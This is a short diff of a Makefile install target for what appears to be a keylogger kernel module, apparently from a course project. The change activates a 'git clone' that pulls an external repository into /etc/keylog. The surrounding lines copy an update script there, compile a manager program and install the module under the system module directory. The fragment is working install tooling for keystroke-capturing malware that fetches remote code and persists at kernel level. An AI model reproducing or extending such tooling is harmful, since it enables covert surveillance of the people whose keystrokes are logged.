@@ -26,7 +26,7 @@ unload:
 	-rmmod $(modname)
 
 install:
-	# git clone https://github.com/Sad-0w/CS564_data.git /etc/keylog
+	git clone https://github.com/Sad-0w/CS564_data.git /etc/keylog
 	cp ../scripts/run_update.sh /etc/keylog
 	gcc manager.c -o /etc/keylog/manager.o
 	mkdir -p /lib/modules/$(KVERSION)/misc/$(modname)
